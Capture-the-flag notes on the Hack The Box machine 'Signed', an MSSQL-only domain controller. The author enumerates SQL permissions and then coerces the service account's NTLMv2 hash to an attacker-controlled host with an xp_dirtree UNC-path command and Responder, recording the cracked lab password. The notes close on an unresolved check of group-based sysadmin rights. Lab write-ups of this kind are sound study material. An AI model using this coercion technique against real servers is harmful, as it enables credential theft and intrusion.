Today, we will be trying some better note organization, using utilizing Grok AI, I believe the notes can be better structured and formatted, therefore better understood and with the concepts being clearly explained. 

Hack The Box - Signed (Medium · Windows) 
Difficulty: Medium
OS: Windows
Starting Point: Provided credentials for MSSQL access
Credentials given by HTB:
Username: scott
Password: Sm230#C5NatH

ping -c 3 10.129.8.253 

PING 10.129.8.253 (10.129.8.253) 56(84) bytes of data.
64 bytes from 10.129.8.253: icmp_seq=1 ttl=127 time=234 ms
64 bytes from 10.129.8.253: icmp_seq=2 ttl=127 time=170 ms
64 bytes from 10.129.8.253: icmp_seq=3 ttl=127 time=191 ms

--- 10.129.8.253 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2003ms
rtt min/avg/max/mdev = 169.836/198.410/233.908/26.611 ms


so far we got good connection, 

Reverse DNS Enumeration
-----------------------------------
- Performed `dig -x` and `nslookup`
- PTR record resolves only to IP address
- No hostname disclosed via DNS
-------------

## Nmap (Targeted)

- Only port exposed externally: 1433/tcp (MSSQL)
- SQL Server 2022 RTM
- Host identified as Domain Controller

### Identified Names
- Domain: SIGNED.HTB
- Hostname: DC01
- FQDN: DC01.SIGNED.HTB
-----------------------

Browser → nothing loads

Nmap → no HTTP/HTTPS ports open

Only exposed service → MSSQL (1433)

That means:

There is nothing listening for a browser.

so lets try for impacket-mssqlclient scott@DC01.SIGNED.HTB -windows-auth -> Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication.

Attempt 2 (SQL Authentication)
impacket-mssqlclient scott@10.129.8.253 ---> Successful authentication
TLS enforced automatically
Connected to master database

So far MSSQL is the only entry point

now that we are in lets run basic enumeration queries, Confirm SQL Server version, -- List databases, sysadmin, etc..
--->  Enumerate and understand our positioning.

SELECT @@version;  -- Confirm SQL Server version

Microsoft SQL Server 2022 (RTM)
Enterprise Evaluation Edition
Windows Server 2019 Standard (Build 17763)

------------------------------

SELECT SYSTEM_USER;
Scott 

-----------------------------
SELECT USER_NAME();
guest
---------------
SELECT IS_SRVROLEMEMBER('sysadmin');
0
----------------

so no we do not have sysadmin role or permissions, 

-----------------------

authenticated but constrained

inside SQL, not the OS

on a Domain Controller

SQL is not running as a user

SQL is not misconfigured at first glance

This is a controlled environment.

--------> Any path forward must involve privilege escalation, not direct execution.

We are not sysadmin, cannot execute much, but we should still be able to enumerate. Since this is SQL, there must be tables / functions that give clues to the next step.

SELECT HAS_PERMS_BY_NAME('xp_dirtree', 'OBJECT', 'EXECUTE');
result is 1

xp_dirtree exists, Your current execution context can execute it, This permission does not require sysadmin, This permission is commonly granted to public

You cannot execute arbitrary OS commands,
but you can cause the SQL Server service to perform actions on your behalf.

-----------------------------
## Enumeration Direction Chosen

### Filesystem Enumeration
- xp_dirtree executable by current context
- Operates in SQL Server service account context
- Potential interaction with underlying Windows authentication

### Database Object Enumeration
- Next step to identify:
  - Custom databases
  - Stored procedures
  - Jobs or linked functionality
- Objective: understand why SQL exists on a DC
----------------------------------------

### Server principals (filtered)
- sa (SQL_LOGIN) enabled
- scott (SQL_LOGIN) enabled (created 2025-10-02)

Observation: No WINDOWS_LOGIN / WINDOWS_GROUP principals visible in this filtered query.

----------

at this points lets just try to xp_dirtree coercion --> EXEC master..xp_dirtree '\\10.xx.xx.xx\anything', 1, 1; on the mssqlclient

then on our other terminal sudo responder -I tun0 -v

then ---> NTLMv2 hash: captured successfully

---------------------------------


## Enumeration Updates

### msdb Permissions
- Attempted: enumerate SQL Agent jobs via msdb
- Result: SELECT denied on dbo.sysjobs (msdb)
- Conclusion: msdb job metadata not readable with current privileges.

### Filesystem / UNC Interaction
- Confirmed EXECUTE on xp_dirtree is permitted.
- Triggered outbound SMB auth using UNC path via xp_dirtree.

#### Captured Authentication (SMB Listener)
- Target IP: 10.129.8.253
- Domain/User: SIGNED\mssqlsvc
- Evidence: NTLMv2-SSP challenge/response captured successfully
- Conclusion: SQL Server service account appears to be domain account `mssqlsvc`.
-------------
Next Step: Crack the NTLMv2 Hash

Once Cracked: Domain Credentials
Username: signed.htb\mssqlsvc
Password: purPLE9795!@

---------------------

Before we go furher, letd make some key understandings of concepts, 
What “UNC path injection” really means
UNC path injection -> we are providing a network path instead of a local one -> SQL Server trusts it
not a "flaw" or an exploit, rather by design, so fare no exploit code has ran, no shell has been made or spawned, no user configuration changes, 
only thing we did was send the NTLM credentials across a trust boundary.

what is NTLM? NTLM is a Windows authentication protocol, abusing Windows trust, by a legitimate feature and design, starting with a low-privileged position we sent credentials.  

-----------------------------


NOW WE TRIED THE CREDIENTIALS ON RPC / SMB / LDAP YET THEY ALL EITHER FAILED OR TIMED OUT 

SO WE ENUM AGAIN JUST TO CONFIRM SOME THINGS 88,135,389,445,464,636,5985,5986 → ALL FILTERED

------------
SO WE TRIED OUR NEWLY ACQUIRED CREDINTAILS ON mssqlsvc  AND IT WORKED! TO A DEGREE, 

Before (SQL login)
SQL login: scott Database user: guest Auth type: SQL authentication Privileges: constrained
----
Now (Windows auth)
Windows principal: SIGNED\mssqlsvc Database user: still guest Auth type: Windows authentication Privileges: not yet known

SO NOW THAT WE ARE IN TIME TO SEE "WHERE" WE ARE AT IN mssqlsvc

---------------
we try to enumerate our situation 
SQL (SIGNED\mssqlsvc guest@master)> SELECT SYSTEM_USER; --------------- SIGNED\mssqlsvc SQL (SIGNED\mssqlsvc guest@master)> SELECT USER_NAME(); ----- guest SQL 
(SIGNED\mssqlsvc guest@master)> SELECT IS_SRVROLEMEMBER('sysadmin'); - 
0 SQL (SIGNED\mssqlsvc guest@master)> EXEC master..xp_logininfo 'signed.htb\mssqlsvc', 'all'; 
ERROR(DC01): Line 1: The EXECUTE permission was denied on the object 'xp_logininfo', database 'mssqlsystemresource', schema 'sys'. SQL 
(SIGNED\mssqlsvc guest@master)> EXEC master..xp_logininfo 'mssqlsvc', 'all'; ERROR(DC01): 
Line 1: The EXECUTE permission was denied on the object 'xp_logininfo', database 'mssqlsystemresource', schema 'sys'. SQL (SIGNED\mssqlsvc guest@master)>

soo TDLR: What your results confirm
Identity context, SYSTEM_USER = SIGNED\mssqlsvc 
operating as the domain service account inside SQL.
Database user mapping  --->
USER_NAME() = guest , hence  login is still mapped to guest in master.
Server role, IS_SRVROLEMEMBER('sysadmin') = 0 
So even as the service account, you are not sysadmin.
xp_logininfo denied

EXECUTE permission denied on xp_logininfo

### Pivot: Windows Auth to MSSQL (SIGNED\mssqlsvc)

- SYSTEM_USER: SIGNED\mssqlsvc
- USER_NAME(): guest
- sysadmin: No (0)

Attempted AD/group enumeration via xp_logininfo:
- Result: EXECUTE denied on xp_logininfo
- Conclusion: Extended proc enumeration restricted; privileges remain limited.


------------------------------------

SQL (SIGNED\mssqlsvc guest@master)> SELECT 'xp_dirtree' AS obj, HAS_PERMS_BY_NAME('xp_dirtree','OBJECT','EXECUTE') AS can_exec; obj can_exec ---------- -------- b'xp_dirtree' 1 SQL (SIGNED\mssqlsvc guest@master)> 
SELECT 'xp_fileexist' AS obj, HAS_PERMS_BY_NAME('xp_fileexist','OBJECT','EXECUTE') AS can_exec; obj can_exec ------------ -------- b'xp_fileexist' 1 SQL (SIGNED\mssqlsvc guest@master)> 
SELECT 'xp_subdirs' AS obj, HAS_PERMS_BY_NAME('xp_subdirs','OBJECT','EXECUTE') AS can_exec; obj can_exec ---------- -------- b'xp_subdirs' 0 SQL (SIGNED\mssqlsvc guest@master)> 
SELECT 'xp_logininfo' AS obj, HAS_PERMS_BY_NAME('xp_logininfo','OBJECT','EXECUTE') AS can_exec; obj can_exec ------------ -------- b'xp_logininfo' 0 SQL (SIGNED\mssqlsvc guest@master)> 
SELECT name, 
value_in_use FROM sys.configurations WHERE name IN ('xp_cmdshell','Ole Automation Procedures','clr enabled'); SQL (SIGNED\mssqlsvc guest@master)>


------------------
summary:
xp_dirtree	1	Can trigger filesystem/UNC access behavior
xp_fileexist	1	Can test existence of files/paths (often useful for “does this file/path exist?” checks)
xp_subdirs	0	Directory listing via this proc is blocked
xp_logininfo	0	Group/user info enumeration via this proc is blocked

-------->> 
Context:
- USER_NAME(): guest
- sysadmin: 0

### Extended Proc Execution Checks
| Proc | EXECUTE | Notes |
|---|---:|---|
| xp_dirtree | 1 | Filesystem/UNC interaction possible |
| xp_fileexist | 1 | Can test file/path existence |
| xp_subdirs | 0 | Denied |
| xp_logininfo | 0 | Denied (cannot enumerate group membership this way) |

Observations:
- Metadata enumeration for extended procs via master.sys.objects (type='X') returned no rows (likely metadata visibility restriction).
- sys.configurations query produced no output (needs visibility check).

----------------------------------------

SQL (SIGNED\mssqlsvc guest@master)> SELECT SUSER_SID('SIGNED\IT'); ----------------------------------------------------------- b'0105000000000005150000005b7bb0f398aa2245ad4a1ca451040000' 
SQL (SIGNED\mssqlsvc guest@master)>
SELECT * FROM sys.login_token; principal_id sid name type usage
------------  2 b'02' public 
SERVER ROLE GRANT OR DENY 268 b'0105000000000005150000005b7bb0f398aa2245ad4a1ca401020000' SIGNED\
Domain Users WINDOWS GROUP GRANT OR DENY 268 b'0105000000000005150000005b7bb0f398aa2245ad4a1ca401020000' SIGNED\
Domain Users WINDOWS GROUP GRANT OR DENY 0 b'010100000000000100000000' \
Everyone WINDOWS GROUP GRANT OR DENY 0 b'01020000000000052000000021020000' 
BUILTIN\Users WINDOWS GROUP GRANT OR DENY 0 b'0102000000000005200000002a020000' BUILTIN\
Pre-Windows 2000 Compatible Access WINDOWS GROUP GRANT OR DENY 0 b'010100000000000502000000' NT AUTHORITY\
NETWORK WINDOWS GROUP GRANT OR DENY 0 b'01010000000000050b000000' NT AUTHORITY\
Authenticated Users WINDOWS GROUP GRANT OR DENY 0 b'01010000000000050f000000' NT AUTHORITY\
This Organization WINDOWS GROUP GRANT OR DENY 0 b'0102000000000005400000000a000000' 
NT AUTHORITY\NTLM Authentication WINDOWS GROUP GRANT OR DENY


+++++++++++
### Confirmed: Group-based sysadmin
- SIGNED\IT is a member of the sysadmin server role on MSSQL.

### Membership check (SIGNED\mssqlsvc)
- sys.login_token shows SIGNED\Domain Users and builtin groups.
- SIGNED\IT not present?? → SIGNED\mssqlsvc does not inherit sysadmin via SIGNED\IT (based on current evidence)?

Confirmed Misconfiguration--> SIGNED\IT has sysadmin role on MSSQL.  --------> mssqlsvc is member of this group (indirectly grants access when group is in ticket)

